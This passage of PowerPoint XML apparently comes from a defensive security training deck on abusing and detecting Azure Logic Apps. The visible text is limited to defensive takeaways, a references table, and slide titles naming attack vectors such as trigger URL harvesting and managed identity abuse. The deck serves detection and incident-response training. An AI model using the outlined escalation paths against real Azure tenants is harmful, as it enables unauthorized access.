            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>Invalidate trigger SAS URLs during incident response - credential revocation alone is insufficient</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>Separate Logic App Contributor from Managed Identity Operator to break the privilege escalation chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>What comes next: Module 04 - Storage Abuse (storage key extraction, SAS token abuse, data plane log correlation)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18565570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0B5F7-5232-5FB5-0989-B0C22AB98FB5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>References</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{948E025D-D124-FE02-405B-63B74CCA1F55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1545690803"/>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3120422860"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5715000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3304249732"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1"/>
                        <a:t>Resource</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1"/>
                        <a:t>Link</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2436412241"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Azure Logic Apps Documentation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>learn.microsoft.com/azure/logic-apps/logic-apps-overview</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3774397967"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>AzureActivity Table Schema</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>learn.microsoft.com/azure/azure-monitor/reference/tables/azureactivity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1879483003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Logic App Managed Identities</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>learn.microsoft.com/azure/logic-apps/authenticate-with-managed-identity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1096476267"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Azure Policy for Logic Apps</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>learn.microsoft.com/azure/logic-apps/block-connections-connectors</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1853033117"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Secure Access in Logic Apps</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>learn.microsoft.com/azure/logic-apps/logic-apps-securing-a-logic-app</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4056955847"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>Key Vault References in Logic Apps</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>learn.microsoft.com/azure/app-service/app-service-key-vault-references</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4169893315"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="627063">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>MITRE ATT&amp;CK T1648 Serverless Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fr-FR" sz="1200"/>
                        <a:t>attack.mitre.org/techniques/T1648</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="404840149"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1295469174"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>
  </p:transition>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Microsoft Security template">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 Security brand template.potx" id="{C2238F5F-88FF-42D2-B2B7-0AA68068F996}" vid="{6D1610A7-A963-40D5-9923-AA1928F2CA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Security brand template</Template>
  <TotalTime>0</TotalTime>
  <Words>4296</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>311</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Consolas</vt:lpstr>
      <vt:lpstr>Segoe UI</vt:lpstr>
      <vt:lpstr>Segoe UI Semibold</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Microsoft Security template</vt:lpstr>
      <vt:lpstr>Logic App Abuse in Azure</vt:lpstr>
      <vt:lpstr>Agenda</vt:lpstr>
      <vt:lpstr>Agenda (cont. 2)</vt:lpstr>
      <vt:lpstr>Objective and MITRE Mapping</vt:lpstr>
      <vt:lpstr>Objective and MITRE Mapping (cont.)</vt:lpstr>
      <vt:lpstr>Why Logic Apps Are an Attack Target</vt:lpstr>
      <vt:lpstr>Why Logic Apps Are an Attack Target (cont.)</vt:lpstr>
      <vt:lpstr>Attack Vector 1 — RBAC Abuse to Edit Workflows</vt:lpstr>
      <vt:lpstr>Attack Vector 1 — RBAC Abuse to Edit Workflows (cont. 2)</vt:lpstr>
      <vt:lpstr>Attack Vector 2 — Trigger URL Harvesting</vt:lpstr>
      <vt:lpstr>Attack Vector 2 — Trigger URL Harvesting (cont. 2)</vt:lpstr>
      <vt:lpstr>Attack Vector 3 — Managed Identity Abuse</vt:lpstr>
      <vt:lpstr>Attack Vector 3 — Managed Identity Abuse (cont.)</vt:lpstr>
      <vt:lpstr>Detection — AzureActivity Key Operations</vt:lpstr>
      <vt:lpstr>Detection — AzureActivity Key Operations (cont.)</vt:lpstr>
      <vt:lpstr>KQL — Detect Workflow Write Operations</vt:lpstr>
      <vt:lpstr>KQL — First-Time Callers (Anomaly Detection)</vt:lpstr>
      <vt:lpstr>KQL — First-Time Callers (Anomaly Detection) (cont.)</vt:lpstr>
      <vt:lpstr>KQL — Trigger URL Retrieval and RBAC Changes</vt:lpstr>
      <vt:lpstr>KQL — Full Suspicious Activity Summary</vt:lpstr>
      <vt:lpstr>Incident Response</vt:lpstr>
      <vt:lpstr>Incident Response (cont. 2)</vt:lpstr>
      <vt:lpstr>Incident Response (cont. 3)</vt:lpstr>
      <vt:lpstr>Hardening Controls</vt:lpstr>
      <vt:lpstr>Key Takeaways</vt:lpstr>
      <vt:lpstr>Key Takeaways (cont. 2)</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Hall</dc:creator>
  <cp:lastModifiedBy>Jacob Hall</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-21T23:52:18Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-21T23:52:26Z</dcterms:modified>
</cp:coreProperties>
</file>